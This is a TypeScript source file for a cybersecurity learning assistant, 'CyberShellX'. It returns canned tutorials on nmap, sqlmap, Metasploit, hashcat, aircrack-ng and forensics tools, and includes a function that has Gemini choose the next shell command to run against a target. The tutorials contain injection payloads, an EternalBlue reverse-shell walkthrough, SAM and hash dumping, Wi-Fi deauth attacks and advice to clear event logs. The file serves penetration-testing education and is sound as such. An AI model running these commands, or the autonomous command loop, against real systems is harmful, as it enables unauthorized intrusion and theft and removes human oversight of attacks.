import fs from 'fs';
import path from 'path';
import { GoogleGenerativeAI } from "@google/generative-ai";

// Gemini API Manager
class GeminiAPIManager {
  private apis: any[] = [];
  private currentApiIndex = 0;

  constructor() {
    const apiKeys = [
      { key: process.env.GEMINI_API_KEY || "", name: "Primary Gemini API" },
      { key: process.env.GEMINI_API_KEY_2 || "", name: "Secondary Gemini API" },
    ];

    this.apis = apiKeys
      .filter(api => api.key.trim() !== "")
      .map(api => ({ ...api, client: new GoogleGenerativeAI(api.key) }));

    if (this.apis.length === 0) {
      console.warn("Warning: No Gemini API keys found. AI enhancement will be disabled.");
    }
  }

  public getGenerativeModel(params: { model: string }) {
    if (this.apis.length === 0) {
      throw new Error("No valid API keys available");
    }
    // Selalu gunakan API saat ini untuk konsistensi dalam sesi chat
    const currentApi = this.apis[this.currentApiIndex];
    return currentApi.client.getGenerativeModel(params);
  }

  private async executeWithFallback<T>(operation: (client: any) => Promise<T>): Promise<T> {
    if (this.apis.length === 0) {
      throw new Error("No valid API keys available");
    }

    let lastError: any;
    for (let i = 0; i < this.apis.length; i++) {
      const api = this.apis[this.currentApiIndex];
      try {
        const result = await operation(api.client);
        return result;
      } catch (error) {
        lastError = error;
        console.warn(`API ${api.name} failed. Switching to next API.`);
        this.currentApiIndex = (this.currentApiIndex + 1) % this.apis.length;
      }
    }
    throw new Error(`All Gemini APIs failed. Last error: ${lastError}`);
  }

  async generateContent(prompt: string): Promise<string> {
    return this.executeWithFallback(async (client) => {
      const model = client.getGenerativeModel({ model: "gemini-1.5-flash"});
      const result = await model.generateContent(prompt);
      const response = await result.response;
      return response.text();
    });
  }
}

const geminiAPI = new GeminiAPIManager();

// Load command knowledge base
let commandsData: any = null;

function loadCommandsData() {
  if (!commandsData) {
    try {
      const commandsPath = path.join(process.cwd(), 'cybershell-commands', 'commands.json');
      const rawData = fs.readFileSync(commandsPath, 'utf8');
      commandsData = JSON.parse(rawData);
    } catch (error) {
      console.error('Error loading commands data:', error);
      commandsData = { categories: {}, ai_prompts: {} };
    }
  }
  return commandsData;
}

export interface CommandResponse {
  type: 'command_explanation' | 'security_analysis' | 'tool_recommendation' | 'general_response' | 'ai_enhanced_response';
  content: string;
  category?: string;
  difficulty?: string;
  tools?: string[];
  legal_notice?: boolean;
}

export class CyberShellAI {
  private commands: any;
  
  constructor() {
    this.commands = loadCommandsData();
  }

  processCommand(userInput: string): CommandResponse {
    const input = userInput.toLowerCase().trim();
    
    // Check for specific command patterns
    if (input.includes('scan') && (input.includes('network') || input.includes('nmap'))) {
      return this.explainNetworkScanning(input);
    }
    
    if (input.includes('vulnerabilit') || input.includes('vuln')) {
      return this.explainVulnerabilityAssessment(input);
    }
    
    if (input.includes('sql') && input.includes('inject')) {
      return this.explainSQLInjection(input);
    }
    
    if (input.includes('metasploit') || input.includes('exploit')) {
      return this.explainMetasploit(input);
    }
    
    if (input.includes('wireshark') || input.includes('traffic') || input.includes('packet')) {
      return this.explainNetworkAnalysis(input);
    }
    
    if (input.includes('password') && (input.includes('crack') || input.includes('hash'))) {
      return this.explainPasswordCracking(input);
    }
    
    if (input.includes('forensic') || input.includes('memory') || input.includes('volatility')) {
      return this.explainForensics(input);
    }
    
    if (input.includes('wireless') || input.includes('wifi') || input.includes('aircrack')) {
      return this.explainWirelessSecurity(input);
    }
    
    // Check for system commands
    if (input.includes('system') && (input.includes('info') || input.includes('check'))) {
      return this.explainSystemAnalysis(input);
    }
    
    // General security advice
    if (input.includes('security') || input.includes('protect') || input.includes('secure')) {
      return this.provideSecurityGuidance(input);
    }
    
    // Default response for unrecognized commands
    return this.provideGeneralGuidance(input);
  }

  private explainNetworkScanning(input: string): CommandResponse {
    const explanation = `🌐 **Network Scanning with Nmap**

**Purpose:** Discover active hosts and services on a network

**Basic Commands:**
\`\`\`bash
# Host Discovery
nmap -sn 192.168.1.0/24

# Port Scan
nmap -sS -p 1-1000 target_ip

# Service Detection
nmap -sV -p 22,80,443 target_ip

# OS Detection
nmap -O target_ip
\`\`\`

**Scanning Techniques:**
- **TCP SYN Scan (-sS)**: Stealthy, doesn't complete connections
- **TCP Connect Scan (-sT)**: Full connection, more detectable
- **UDP Scan (-sU)**: Scans UDP ports (slower)
- **Aggressive Scan (-A)**: OS detection + version detection + scripts

**Output Analysis:**
- **Open**: Service actively accepting connections
- **Closed**: Port reachable but no service listening
- **Filtered**: Firewall/filter blocking probe packets

**Legal Considerations:**
⚠️ Only scan networks you own or have explicit written permission to test.
Unauthorized scanning may violate laws and network policies.`;

    return {
      type: 'command_explanation',
      content: explanation,
      category: 'networking',
      difficulty: 'intermediate',
      tools: ['nmap', 'masscan', 'zmap'],
      legal_notice: true
    };
  }

  private explainVulnerabilityAssessment(input: string): CommandResponse {
    const explanation = `🛡️ **Vulnerability Assessment Process**

**Automated Scanning:**
\`\`\`bash
# Nmap vulnerability scripts
nmap --script vuln target_ip

# Nikto web server scanner
nikto -h http://target.com

# OpenVAS/Greenbone scan
gvm-cli socket --xml="<get_tasks/>"
\`\`\`

**Manual Testing Checklist:**
1. **Information Gathering**
   - DNS enumeration
   - WHOIS lookups
   - Social media reconnaissance

2. **Network Assessment**
   - Port scanning
   - Service fingerprinting
   - Protocol analysis

3. **Application Testing**
   - Input validation
   - Authentication bypass
   - Session management

4. **Configuration Review**
   - Default credentials
   - Unnecessary services
   - Patch levels

**Risk Classification:**
- **Critical**: Immediate threat to system security
- **High**: Significant risk requiring prompt attention
- **Medium**: Moderate risk, address in planned maintenance
- **Low**: Minor issues for future consideration

**Reporting Format:**
- Executive summary with business impact
- Technical details with proof-of-concept
- Risk ratings and remediation timeline
- Defensive recommendations

⚠️ **Authorization Required**: Always obtain proper written authorization before testing.`;

    return {
      type: 'security_analysis',
      content: explanation,
      category: 'assessment',
      difficulty: 'intermediate',
      tools: ['nmap', 'nikto', 'openvas', 'nessus'],
      legal_notice: true
    };
  }

  private explainSQLInjection(input: string): CommandResponse {
    const explanation = `💉 **SQL Injection Testing & Prevention**

**Detection Techniques:**
\`\`\`bash
# SQLMap automated testing
sqlmap -u "http://target.com/page.php?id=1"

# Manual testing payloads
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
'; DROP TABLE users; --
\`\`\`

**Types of SQL Injection:**
1. **Union-based**: Combines results from multiple queries
2. **Boolean-based**: Uses true/false responses
3. **Time-based**: Uses database delays for confirmation
4. **Error-based**: Extracts data from error messages

**SQLMap Advanced Usage:**
\`\`\`bash
# Database enumeration
sqlmap -u "URL" --dbs

# Table enumeration
sqlmap -u "URL" -D database_name --tables

# Data extraction
sqlmap -u "URL" -D db_name -T table_name --dump

# Shell access
sqlmap -u "URL" --os-shell
\`\`\`

**Prevention Measures:**
1. **Parameterized Queries**: Use prepared statements
2. **Input Validation**: Whitelist acceptable characters
3. **Least Privilege**: Database user with minimal permissions
4. **WAF Protection**: Web Application Firewall rules
5. **Regular Updates**: Keep database software current

**Example Secure Code (PHP):**
\`\`\`php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
\`\`\`

⚠️ **Ethical Testing**: Only test applications you own or have permission to assess.`;

    return {
      type: 'command_explanation',
      content: explanation,
      category: 'exploitation',
      difficulty: 'intermediate',
      tools: ['sqlmap', 'burp-suite', 'owasp-zap'],
      legal_notice: true
    };
  }

  private explainMetasploit(input: string): CommandResponse {
    const explanation = `🎯 **Metasploit Framework Usage**

**Starting Metasploit:**
\`\`\`bash
# Launch console
msfconsole

# Update database
msfdb init && msfdb start
\`\`\`

**Basic Commands:**
\`\`\`bash
# Search for exploits
search type:exploit platform:windows

# Select exploit module
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set target
set RHOSTS 192.168.1.100

# Set payload
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50

# Execute exploit
exploit
\`\`\`

**Module Types:**
1. **Exploits**: Code that takes advantage of vulnerabilities
2. **Payloads**: Code executed after successful exploitation
3. **Auxiliary**: Scanning, fuzzing, and other helper modules
4. **Encoders**: Obfuscate payloads to avoid detection
5. **NOPs**: No-operation code for buffer alignment

**Meterpreter Commands:**
\`\`\`bash
# System information
sysinfo

# Process list
ps

# Upload/download files
upload /path/to/local/file C:\\\\Windows\\\\Temp\\\\
download C:\\\\Windows\\\\System32\\\\config\\\\SAM

# Screenshot
screenshot

# Privilege escalation
getsystem
\`\`\`

**Post-Exploitation Modules:**
- **windows/gather/smart_hashdump**: Extract password hashes
- **windows/manage/migrate**: Process migration
- **multi/manage/shell_to_meterpreter**: Upgrade shells

**Operational Security:**
- Use staged payloads for larger binaries
- Enable encryption for C2 communications
- Clear event logs and traces
- Use legitimate processes for persistence

⚠️ **Legal Authorization**: Only use on systems you own or have explicit permission to test.`;

    return {
      type: 'command_explanation',
      content: explanation,
      category: 'exploitation',
      difficulty: 'advanced',
      tools: ['metasploit', 'meterpreter', 'msfvenom'],
      legal_notice: true
    };
  }

  private explainNetworkAnalysis(input: string): CommandResponse {
    const explanation = `📊 **Network Traffic Analysis**

**Wireshark Fundamentals:**
\`\`\`bash
# Command line capture
tshark -i eth0 -w capture.pcap

# Live analysis
tshark -i eth0 -f "port 80"

# Read capture file
tshark -r capture.pcap -Y "http"
\`\`\`

**Display Filters:**
\`\`\`
# HTTP traffic
http

# Specific IP address
ip.addr == 192.168.1.100

# TCP traffic on port 443
tcp.port == 443

# DNS queries
dns.flags.response == 0

# Failed TCP connections
tcp.flags.reset == 1
\`\`\`

**Protocol Analysis:**
1. **TCP Stream Analysis**
   - Follow TCP streams for complete conversations
   - Analyze connection establishment and teardown
   - Identify retransmissions and errors

2. **HTTP Analysis**
   - Extract credentials from unencrypted traffic
   - Analyze headers for security misconfigurations
   - Identify file transfers and downloads

3. **DNS Analysis**
   - Monitor for DNS tunneling
   - Identify malicious domains
   - Analyze resolution patterns

**Network Forensics Workflow:**
1. **Collection**: Capture or acquire network data
2. **Preservation**: Maintain chain of custody
3. **Analysis**: Examine traffic patterns and content
4. **Documentation**: Record findings and evidence
5. **Presentation**: Prepare reports for stakeholders

**Security Monitoring Use Cases:**
- Intrusion detection and incident response
- Malware communication analysis
- Data exfiltration detection
- Network performance troubleshooting
- Compliance and audit requirements

**Advanced Features:**
- **GeoIP Resolution**: Map IP addresses to locations
- **Expert System**: Automated problem detection
- **Statistics**: Protocol hierarchy and conversations
- **VoIP Analysis**: SIP and RTP protocol support

⚠️ **Privacy Considerations**: Only capture traffic on networks you own or have authorization to monitor.`;

    return {
      type: 'command_explanation',
      content: explanation,
      category: 'networking',
      difficulty: 'intermediate',
      tools: ['wireshark', 'tshark', 'tcpdump', 'networkminer'],
      legal_notice: true
    };
  }

  private explainPasswordCracking(input: string): CommandResponse {
    const explanation = `🔐 **Password Security & Hash Cracking**

**Hashcat Usage:**
\`\`\`bash
# Dictionary attack
hashcat -m 0 -a 0 hashes.txt rockyou.txt

# Brute force attack
hashcat -m 1000 -a 3 ntlm_hashes.txt ?a?a?a?a?a?a

# Rule-based attack
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r best64.rule

# Combinator attack
hashcat -m 0 -a 1 hashes.txt dict1.txt dict2.txt
\`\`\`

**Common Hash Types:**
- **MD5 (-m 0)**: 32 hex characters
- **SHA1 (-m 100)**: 40 hex characters
- **NTLM (-m 1000)**: Windows password hashes
- **bcrypt (-m 3200)**: Strong adaptive hash function
- **WPA2 (-m 22000)**: Wireless network passwords

**John the Ripper:**
\`\`\`bash
# Dictionary attack
john --wordlist=rockyou.txt shadow

# Incremental mode
john --incremental passwords.txt

# Show cracked passwords
john --show shadow

# Custom rules
john --rules=MyRules --wordlist=dict.txt hashes
\`\`\`

**Hash Identification:**
\`\`\`bash
# Using hashid
hashid -m hash.txt

# Using hash-identifier
hash-identifier
\`\`\`

**Password Attack Strategies:**
1. **Dictionary Attacks**: Use common passwords
2. **Rule-based Attacks**: Modify dictionary words
3. **Brute Force**: Try all combinations (time-intensive)
4. **Hybrid Attacks**: Combine dictionary + brute force
5. **Mask Attacks**: Target specific patterns

**Password Security Best Practices:**
- **Length**: Minimum 12 characters
- **Complexity**: Mix of uppercase, lowercase, numbers, symbols
- **Uniqueness**: Different passwords for each account
- **Storage**: Use password managers
- **2FA**: Enable two-factor authentication

**Enterprise Password Policies:**
- Regular password changes (90-180 days)
- Account lockout after failed attempts
- Password history prevention
- Complexity requirements enforcement
- Breach monitoring and notification

⚠️ **Legal Notice**: Only crack hashes you own or have explicit permission to test. Unauthorized access is illegal.`;

    return {
      type: 'command_explanation',
      content: explanation,
      category: 'crypto',
      difficulty: 'intermediate',
      tools: ['hashcat', 'john', 'hydra', 'medusa'],
      legal_notice: true
    };
  }

  private explainForensics(input: string): CommandResponse {
    const explanation = `🔍 **Digital Forensics & Memory Analysis**

**Volatility Framework:**
\`\`\`bash
# Identify OS profile
volatility -f memory.dump imageinfo

# List running processes
volatility -f memory.dump --profile=Win7SP1x64 pslist

# Network connections
volatility -f memory.dump --profile=Win7SP1x64 netscan

# Command line history
volatility -f memory.dump --profile=Win7SP1x64 cmdline

# Malware detection
volatility -f memory.dump --profile=Win7SP1x64 malfind
\`\`\`

**Memory Acquisition:**
\`\`\`bash
# Windows - using DumpIt
DumpIt.exe /output C:\\memory.dump

# Linux - using LiME
insmod lime.ko "path=/tmp/memory.dump format=lime"

# VMware snapshot
vmss2core -W memory.vmss memory.dump
\`\`\`

**Forensic Analysis Process:**
1. **Acquisition**: Create bit-for-bit copies
2. **Preservation**: Maintain evidence integrity
3. **Analysis**: Extract and examine artifacts
4. **Documentation**: Record all findings
5. **Presentation**: Prepare court-ready reports

**Disk Forensics with Autopsy:**
- **Timeline Analysis**: Chronological file activity
- **Keyword Search**: Find relevant evidence
- **Hash Analysis**: Identify known files
- **Registry Analysis**: Windows system artifacts
- **Email Recovery**: Deleted message reconstruction

**Mobile Forensics:**
\`\`\`bash
# Android ADB extraction
adb backup -apk -shared -nosystem

# iOS logical acquisition (jailbroken)
idevicebackup2 backup --full ./backup_folder

# SQLite database analysis
sqlite3 database.db ".tables"
\`\`\`

**Network Forensics:**
- **Packet Analysis**: Full network reconstructions
- **Flow Analysis**: Connection summaries
- **Protocol Reconstruction**: Application layer data
- **Geolocation**: IP address mapping
- **Timeline Correlation**: Multi-source events

**Anti-Forensics Countermeasures:**
- **Encryption Detection**: Identify encrypted volumes
- **Steganography**: Hidden data in images/files
- **Timestamp Manipulation**: Altered file times
- **Secure Deletion**: Overwritten data recovery
- **Virtual Machines**: Evidence containerization

**Legal Considerations:**
- Chain of custody maintenance
- Evidence authentication procedures
- Expert testimony preparation
- Court admissibility standards
- Privacy and warrant requirements

⚠️ **Professional Ethics**: Follow legal procedures and respect privacy rights during investigations.`;

    return {
      type: 'command_explanation',
      content: explanation,
      category: 'forensics',
      difficulty: 'advanced',
      tools: ['volatility', 'autopsy', 'sleuthkit', 'encase'],
      legal_notice: true
    };
  }

  private explainWirelessSecurity(input: string): CommandResponse {
    const explanation = `📡 **Wireless Network Security Assessment**

**Aircrack-ng Suite:**
\`\`\`bash
# Enable monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauthentication attack
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA2 password
aircrack-ng -w wordlist.txt capture-01.cap
\`\`\`

**Wireless Security Protocols:**
1. **WEP (Deprecated)**: Easily crackable, avoid use
2. **WPA/WPA2**: Strong when using complex passwords
3. **WPA3**: Latest standard with enhanced security
4. **Enterprise (802.1X)**: Certificate-based authentication

**Advanced Wireless Attacks:**
\`\`\`bash
# Evil Twin Access Point
hostapd evil_twin.conf

# KARMA attack (auto-connect)
karma.py -i wlan0mon

# Wi-Fi Pineapple modules
pineapple karma dns_spoof ssl_strip
\`\`\`

**Bluetooth Security:**
\`\`\`bash
# Device discovery
hcitool scan

# Service enumeration
sdptool browse MAC_ADDRESS

# Bluez utilities
bluetoothctl scan on
\`\`\`

**Wireless Reconnaissance:**
- **SSID Collection**: Network names and configurations
- **Client Identification**: Connected device analysis
- **Signal Strength**: Physical location estimation
- **Encryption Analysis**: Security implementation assessment
- **Vendor Identification**: Equipment manufacturer details

**Enterprise Wireless Security:**
- **Certificate Management**: PKI infrastructure
- **RADIUS Authentication**: Centralized access control
- **Network Segmentation**: VLAN isolation
- **Monitoring Systems**: Rogue AP detection
- **Policy Enforcement**: Device compliance checking

**Physical Security Considerations:**
- **RF Shielding**: Prevent signal leakage
- **Antenna Placement**: Optimize coverage areas
- **Power Control**: Minimize unnecessary range
- **Location Services**: Disable when not needed
- **Guest Networks**: Isolated visitor access

**Wireless Security Best Practices:**
- Use WPA3 or WPA2 with strong passwords
- Disable WPS (Wi-Fi Protected Setup)
- Enable MAC address filtering (limited effectiveness)
- Regular firmware updates for access points
- Monitor for unauthorized access points

⚠️ **Legal Authorization**: Only test wireless networks you own or have written permission to assess.`;

    return {
      type: 'command_explanation',
      content: explanation,
      category: 'wireless',
      difficulty: 'advanced',
      tools: ['aircrack-ng', 'kismet', 'wifite', 'reaver'],
      legal_notice: true
    };
  }

  private explainSystemAnalysis(input: string): CommandResponse {
    const explanation = `⚙️ **System Security Analysis**

**System Information Gathering:**
\`\`\`bash
# Windows system info
systeminfo
wmic os get Caption,Version,BuildNumber
Get-ComputerInfo

# Linux system info
uname -a
cat /etc/os-release
lscpu && free -h && df -h
\`\`\`

**Process and Service Analysis:**
\`\`\`bash
# Windows processes
tasklist /svc
Get-Process | Sort-Object CPU -Descending

# Linux processes
ps aux --sort=-%cpu
top -o %CPU

# Network connections
netstat -tulpn
ss -tulpn
\`\`\`

**Security Configuration Review:**
\`\`\`bash
# Windows security policies
secpol.msc
gpresult /h report.html

# Linux security settings
cat /etc/passwd
cat /etc/shadow
sudo -l

# Firewall status
ufw status (Ubuntu)
firewall-cmd --list-all (CentOS/RHEL)
\`\`\`

**Log Analysis:**
\`\`\`bash
# Windows Event Logs
Get-EventLog -LogName Security -Newest 100
wevtutil qe Security /c:100 /f:text

# Linux system logs
tail -f /var/log/auth.log
journalctl -f -u ssh.service
grep "Failed password" /var/log/auth.log
\`\`\`

**Vulnerability Assessment:**
1. **Patch Management**: Check for missing updates
2. **Service Hardening**: Disable unnecessary services
3. **User Account Review**: Audit permissions and access
4. **Network Configuration**: Review firewall rules
5. **File System Permissions**: Check sensitive file access

**System Hardening Checklist:**
- **Remove default accounts**: Delete or disable unused accounts
- **Strong password policies**: Enforce complexity requirements
- **Principle of least privilege**: Minimal necessary permissions
- **Regular updates**: Apply security patches promptly
- **Audit logging**: Enable comprehensive monitoring
- **Backup strategy**: Regular, tested backups
- **Encryption**: Protect data at rest and in transit

**Monitoring and Alerting:**
\`\`\`bash
# Failed login attempts
grep "Failed password" /var/log/auth.log | tail -10

# Suspicious network activity
netstat -an | grep ESTABLISHED

# Resource utilization
iostat 1 5
vmstat 1 5
\`\`\`

**Incident Response Preparation:**
- Document baseline system state
- Establish monitoring thresholds
- Create incident response procedures
- Test backup and recovery processes
- Train staff on security protocols

⚠️ **System Safety**: Always test changes in non-production environments first.`;

    return {
      type: 'command_explanation',
      content: explanation,
      category: 'system',
      difficulty: 'beginner',
      tools: ['systeminfo', 'netstat', 'ps', 'top', 'journalctl'],
      legal_notice: false
    };
  }

  private provideSecurityGuidance(input: string): CommandResponse {
    const guidance = `🛡️ **Cybersecurity Best Practices**

**Defense in Depth Strategy:**
1. **Physical Security**: Secure facilities and hardware
2. **Network Security**: Firewalls, IDS/IPS, segmentation
3. **Endpoint Security**: Antivirus, EDR, device management
4. **Application Security**: Secure coding, testing, WAF
5. **Data Security**: Encryption, DLP, classification
6. **Identity Management**: Authentication, authorization, SSO
7. **Monitoring**: SIEM, logging, threat intelligence

**Security Framework Implementation:**
- **NIST Cybersecurity Framework**: Identify, Protect, Detect, Respond, Recover
- **ISO 27001**: Information security management systems
- **CIS Controls**: Critical security controls for effective cyber defense
- **OWASP Top 10**: Web application security risks

**Threat Modeling Process:**
1. **Asset Identification**: What are we protecting?
2. **Threat Analysis**: What can go wrong?
3. **Vulnerability Assessment**: How can it go wrong?
4. **Risk Evaluation**: What is the business impact?
5. **Countermeasure Selection**: How do we prevent/mitigate?

**Security Awareness Training Topics:**
- **Phishing Recognition**: Email security awareness
- **Password Security**: Strong authentication practices
- **Social Engineering**: Manipulation technique awareness
- **Physical Security**: Tailgating, badge security
- **Data Handling**: Classification and protection
- **Incident Reporting**: When and how to report

**Continuous Improvement:**
- Regular security assessments and audits
- Threat intelligence integration
- Security metrics and KPIs
- Lessons learned from incidents
- Technology refresh and updates

**Compliance Considerations:**
- **GDPR**: Data privacy and protection (EU)
- **HIPAA**: Healthcare information protection (US)
- **PCI DSS**: Payment card industry standards
- **SOX**: Financial reporting controls (US)
- **ISO 27001**: International security standards

Remember: Security is a journey, not a destination. Stay informed about emerging threats and continuously improve your security posture.`;

    return {
      type: 'general_response',
      content: guidance,
      category: 'security',
      difficulty: 'beginner',
      tools: ['security-frameworks', 'compliance-tools', 'monitoring-systems'],
      legal_notice: false
    };
  }

  private provideGeneralGuidance(input: string): CommandResponse {
    const guidance = `🤖 **CyberShellX AI Assistant**

I'm here to help you with cybersecurity topics! I can provide guidance on:

**🌐 Network Security:**
- Network scanning and reconnaissance
- Traffic analysis and monitoring
- Firewall configuration and testing

**🎯 Penetration Testing:**
- Vulnerability assessment methodologies
- Exploitation techniques and tools
- Post-exploitation and persistence

**🔍 Digital Forensics:**
- Memory analysis and artifact recovery
- Disk forensics and timeline analysis
- Network forensics and incident response

**🔐 Cryptography:**
- Hash cracking and password security
- Encryption implementation and testing
- PKI and certificate management

**📡 Wireless Security:**
- Wi-Fi security assessment
- Bluetooth and RF analysis
- Mobile device security

**⚙️ System Security:**
- Security configuration review
- Log analysis and monitoring
- Hardening and compliance

**Available Commands:**
- \`scan network\` - Network discovery techniques
- \`check vulnerabilities\` - Vulnerability assessment
- \`sql injection\` - Web application security
- \`crack passwords\` - Password security testing
- \`analyze memory\` - Digital forensics
- \`wireless security\` - Wi-Fi assessment
- \`system info\` - Security configuration

**Learning Resources:**
- Interactive scenarios for hands-on practice
- Step-by-step tutorials for security tools
- Best practices and methodology guidance
- Legal and ethical hacking guidelines

Type a specific command or ask about any cybersecurity topic!

⚠️ **Important**: Always ensure you have proper authorization before testing or assessing any systems.`;

    return {
      type: 'general_response',
      content: guidance,
      category: 'general',
      difficulty: 'beginner',
      tools: ['cybershellx-ai'],
      legal_notice: true
    };
  }

  // Get random learning prompt for interactive engagement
  getRandomLearningPrompt(): string {
    const prompts = this.commands.ai_prompts?.learning_prompts || [];
    return prompts[Math.floor(Math.random() * prompts.length)] || 
           "What cybersecurity topic would you like to learn about today?";
  }

  // Get ethical guidelines
  getEthicalGuidelines(): string[] {
    return this.commands.ai_prompts?.ethical_guidelines || [];
  }

  // Get interactive scenario by difficulty
  async enhanceResponseWithAI(userInput: string, baseResponse: CommandResponse): Promise<CommandResponse> {
    try {
      const prompt = `You are CyberShellX AI, an expert cybersecurity assistant. 
User asked: "${userInput}"
Base response: "${baseResponse.content}"

Enhance this response with:
1. More technical details if appropriate
2. Practical examples
3. Security best practices
4. Educational context

Keep the response concise but informative (max 300 words).`;

      const enhancedContent = await geminiAPI.generateContent(prompt);
      
      return {
        ...baseResponse,
        content: enhancedContent,
        type: 'ai_enhanced_response'
      };
    } catch (error) {
      console.error('AI enhancement failed:', error);
      return baseResponse; // Return original response if AI fails
    }
  }

  getInteractiveScenario(difficulty: 'beginner' | 'intermediate' | 'advanced') {
    const scenarios = this.commands.interactive_scenarios?.[difficulty] || [];
    return scenarios[Math.floor(Math.random() * scenarios.length)] || null;
  }

  async determineNextCommand(target: string, objectives: string[], history: any[], notes?: any): Promise<string> {
    let notesSummary = "No notes yet.";
    if (notes && Object.keys(notes).length > 0) {
      notesSummary = `Here are the current notes about the target:\n${JSON.stringify(notes, null, 2)}`;
    }

    const systemPrompt = `You are CyberShellX, an AI-driven penetration testing expert. Your goal is to achieve the following objectives against the target "${target}":
- ${objectives.join('\n- ')}

${notesSummary}

You will be given a history of commands and their outputs. Based on this history and the notes, decide on the single next command to execute.
The available tools are: nmap, nuclei, sqlmap, gobuster, hydra, john, aircrack-ng, msfconsole, searchsploit.

Rules:
1.  **Analyze**: Carefully analyze the previous command's output and the existing notes to inform your next step.
2.  **Strategize**: Do not just run random scans. Think like a real pentester. If you've found a web server, probe it. If you find a vulnerability, try to learn more about it.
3.  **Avoid Repetition**: Do not run a command if a similar one has already been run and yielded results. Check the history.
4.  **FINISH Condition**: If the objectives are clearly met, or if you've exhausted all logical next steps, respond with the single word "FINISH".
5.  **Output Format**: Respond with ONLY the next shell command to execute. Do not add any explanation, formatting, or backticks.

Example Response: nmap -sV -p- ${target}
Example Response: FINISH`;

    const model = geminiAPI.getGenerativeModel({ model: "gemini-1.5-flash" });
    const chat = model.startChat({
        history: history,
        generationConfig: {
            temperature: 0.2, // Lower temperature for more deterministic commands
        },
        systemInstruction: systemPrompt,
    });
    const result = await chat.sendMessage("What is the next command?");
    const response = await result.response;
    const nextCommand = response.text().trim();

    console.log(`[AI Decision] Next command: ${nextCommand}`);
    return nextCommand;
  }

  async extractInfoFromOutput(command: string, output: string): Promise<any> {
    const prompt = `You are a cybersecurity analyst bot. Your task is to extract key information from the output of a security tool.
Summarize the findings in a valid JSON object. Focus on actionable intelligence like open ports, discovered vulnerabilities, found directories, potential usernames, etc.
If no specific findings, return an empty JSON object {}.

Command: ${command}
Output:
${output}

Respond with ONLY the JSON object. Do not include any other text or formatting like backticks.`;

    let retries = 2;
    while (retries > 0) {
      try {
        const response = await geminiAPI.generateContent(prompt);
        const cleanedResponse = response.replace(/```json|```/g, '').trim();
        // Handle case where AI might still return non-JSON
        if (!cleanedResponse.startsWith('{') || !cleanedResponse.endsWith('}')) {
          throw new Error("Invalid JSON format from AI");
        }
        return JSON.parse(cleanedResponse);
      } catch (error) {
        console.error(`Error during info extraction (attempt ${3 - retries}):`, error);
        retries--;
        if (retries === 0) {
          return { error: "Failed to parse AI response after multiple attempts", details: (error as Error).message };
        }
      }
    }
  }
}

// Export singleton instance
export const cyberShellAI = new CyberShellAI();